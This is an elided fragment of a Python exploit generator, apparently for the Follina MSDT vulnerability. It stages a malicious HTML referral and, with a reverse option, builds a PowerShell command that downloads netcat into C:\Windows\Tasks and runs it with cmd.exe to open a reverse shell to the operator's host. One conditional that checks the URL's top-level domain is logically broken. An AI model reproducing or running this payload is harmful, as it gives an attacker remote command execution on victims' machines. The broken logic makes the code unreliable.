...
parser.add_argument(
    "--url",
    "-u",
    help="Url of your servo server or tunnel server else",
)
...
def main(args):
    ...
    if args.interface:
        ...
        try:
            tld = tldextract.extract(f'{args.url}')
            if tld[-1] != "0" or "1" or "2" or "3" or "4" or "5" or "6" or "7" or "8" or "9":
                try:
                    ip_host = ipaddress.IPv4Address(args.ip)
                except ipaddress.AddressValueError:
                    try:
                        ip_host = netifaces.ifaddresses(args.ip)[netifaces.AF_INET][0][
                            "addr"
                        ]
                    except ValueError:
                        print(
                            "[!] error. did you provide an interface or ip?"
                        )
                        exit()
        except ValueError:
            print(
    ...
    if args.interface and args.port:
        external_referral = external_referral.replace(
            "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
        )
    elif args.url and args.ip and args.port:
        external_referral = external_referral.replace(
            "{staged_html}", f"{args.url}/index.html"
        )
    ...
    if args.reverse:
        if args.interface and args.port:
            ...
            command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {ip_host} {args.reverse}"""
